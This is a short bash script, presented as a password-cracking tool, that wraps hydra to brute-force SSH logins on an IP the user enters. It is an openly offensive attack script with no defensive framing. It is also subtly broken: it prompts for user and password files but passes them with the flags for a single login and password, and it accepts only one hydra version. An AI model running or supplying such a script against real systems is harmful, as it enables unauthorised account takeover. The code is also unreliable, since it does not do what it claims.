#!/bin/bash
#
echo "====+=======+=====+======="
echo " Password cracking (bash) "
echo "======+=====+======+======"
pkg=$(hydra --version | grep Hydra | awk '{print $2}')
if [ "$pkg" == "v9.5" ];then 
	read -p "Enter your user text file: " add
	read -p "Enter your pass text file: " pas
	read -p "enter your ip: " a
       hydra -l $add -p $pas ssh://$a -vV -f
else
        echo "[!] hydra is not installed. please install it using: sudo apt install hydra"
       exit 1
fi
